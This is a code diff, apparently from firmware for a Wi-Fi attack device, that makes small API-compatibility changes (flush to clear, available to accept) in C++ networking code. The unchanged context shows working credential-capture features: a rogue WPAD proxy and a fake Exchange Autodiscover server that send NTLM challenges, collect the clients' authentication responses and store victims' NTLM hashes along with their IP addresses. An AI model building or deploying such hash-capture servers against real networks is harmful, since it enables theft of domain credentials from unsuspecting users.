@@ -66,7 +66,7 @@ static std::vector<uint8_t> build_type2(void) {
     std::vector<uint8_t> h; h.reserve(200);
     auto le16 = [&](uint16_t v){ h.push_back(v&0xFF); h.push_back(v>>8); };
     auto le32 = [&](uint32_t v){ h.push_back(v); h.push_back(v>>8); h.push_back(v>>16); h.push_back(v>>24); };
-    auto pushUTF16 = [&](const char *s) { while(*s) { h.push_back((uint8_t)*s); h.push_back(0); s++; } };
+    [[maybe_unused]] auto pushUTF16 = [&](const char *s) { while(*s) { h.push_back((uint8_t)*s); h.push_back(0); s++; } };
 
     /* signature + type 2 */
     const char sig[] = "NTLMSSP";
@@ -235,7 +235,7 @@ static void handle_wpad_client(WiFiClient &client) {
         client.print(F("HTTP/1.1 407 Proxy Authentication Required\r\n"
             "Proxy-Authenticate: NTLM\r\n"
             "Connection: close\r\nContent-Length: 0\r\n\r\n"));
-        client.flush(); client.stop();
+        client.clear(); client.stop();
         return;
     }
 
@@ -255,7 +255,7 @@ static void handle_wpad_client(WiFiClient &client) {
             "Proxy-Authenticate: NTLM " + t2b64 + "\r\n"
             "Proxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n"
             "Content-Length: 0\r\n\r\n");
-        client.flush();
+        client.clear();
 
         /* Wait for Type3 on same connection */
         String rl2 = read_line(client, 5000); rl2.trim();
@@ -270,11 +270,11 @@ static void handle_wpad_client(WiFiClient &client) {
             }
         }
         client.print(F("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 0\r\n\r\n"));
-        client.flush(); client.stop();
+        client.clear(); client.stop();
     } else if (mtype == 3) {
         save_ntlm_hash(raw, rawLen, client.remoteIP());
         client.print(F("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 0\r\n\r\n"));
-        client.flush(); client.stop();
+        client.clear(); client.stop();
     } else {
         client.stop();
     }
@@ -316,7 +316,7 @@ void feat_wpad_abuse(void)
     uint32_t tUI = 0;
     while (true) {
         dns.processNextRequest();
-        WiFiClient c = proxy.available();
+        WiFiClient c = proxy.accept();
         if (c) handle_wpad_client(c);
 
         uint16_t k = input_poll();
@@ -393,7 +393,7 @@ static void ad_handle_client(WiFiClient &client) {
     /* CONNECT — reject cleanly */
     if (method == "CONNECT") {
         client.print(F("HTTP/1.1 400 Bad Request\r\nConnection: close\r\nContent-Length: 0\r\n\r\n"));
-        client.flush(); client.stop(); return;
+        client.clear(); client.stop(); return;
     }
 
     String headers = read_headers(client);
@@ -414,19 +414,19 @@ static void ad_handle_client(WiFiClient &client) {
         const char *pac = "function FindProxyForURL(url,host){return\"DIRECT\";}";
         client.printf("HTTP/1.1 200 OK\r\nContent-Type: application/x-ns-proxy-autoconfig\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s",
             (int)strlen(pac), pac);
-        client.flush(); client.stop(); return;
+        client.clear(); client.stop(); return;
     }
     if (uri == "/connecttest.txt" || uri == "/ncsi.txt" || uri == "/generate_204" || uri == "/gen_204" ||
         uri == "/hotspot-detect.html" || uri == "/success.txt") {
         client.print(F("HTTP/1.1 200 OK\r\nContent-Length: 7\r\nConnection: close\r\n\r\nsuccess"));
-        client.flush(); client.stop(); return;
+        client.clear(); client.stop(); return;
     }
 
     /* Only process /autodiscover paths */
     String uriL = uri; uriL.toLowerCase();
     if (uriL.indexOf("/autodiscover") < 0) {
         client.print(F("HTTP/1.1 404 Not Found\r\nConnection: close\r\nContent-Length: 0\r\n\r\n"));
-        client.flush(); client.stop(); return;
+        client.clear(); client.stop(); return;
     }
 
     String authH = get_header(headers, "Authorization");
@@ -457,7 +457,7 @@ static void ad_handle_client(WiFiClient &client) {
 
             String xml = ad_xml_response(domain);
             client.print("HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\nContent-Length: " + String(xml.length()) + "\r\nConnection: close\r\n\r\n" + xml);
-            client.flush(); client.stop(); return;
+            client.clear(); client.stop(); return;
         }
     }
 
@@ -473,7 +473,7 @@ static void ad_handle_client(WiFiClient &client) {
             String t2b64 = b64_encode(t2.data(), t2.size());
             client.print("HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM " + t2b64 +
                 "\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n");
-            client.flush();
+            client.clear();
 
             /* Wait for Type3 on same connection */
             String rl2 = read_line(client, 5000); rl2.trim();
@@ -496,7 +496,7 @@ static void ad_handle_client(WiFiClient &client) {
             if (domain.length()==0) domain = "company.local";
             String xml = ad_xml_response(domain);
             client.print("HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\nContent-Length: " + String(xml.length()) + "\r\nConnection: close\r\n\r\n" + xml);
-            client.flush(); client.stop(); return;
+            client.clear(); client.stop(); return;
         } else if (mtype == 3) {
             save_ntlm_hash(raw, rawLen, client.remoteIP());
             s_ad_ntlm++;
@@ -506,7 +506,7 @@ static void ad_handle_client(WiFiClient &client) {
             if (domain.length()==0) domain = "company.local";
             String xml = ad_xml_response(domain);
             client.print("HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\nContent-Length: " + String(xml.length()) + "\r\nConnection: close\r\n\r\n" + xml);
-            client.flush(); client.stop(); return;
+            client.clear(); client.stop(); return;
         }
     }
 
@@ -516,7 +516,7 @@ static void ad_handle_client(WiFiClient &client) {
         "WWW-Authenticate: NTLM\r\n"
         "Content-Type: text/plain\r\nContent-Length: 12\r\n"
         "Connection: close\r\n\r\nUnauthorized"));
-    client.flush(); client.stop();
+    client.clear(); client.stop();
 }
 
 void feat_autodiscover(void)
@@ -552,7 +552,7 @@ void feat_autodiscover(void)
     uint32_t tUI = 0;
     while (true) {
         dns.processNextRequest();
-        WiFiClient c = srv.available();
+        WiFiClient c = srv.accept();
         if (c) ad_handle_client(c);
 
         uint16_t k = input_poll();
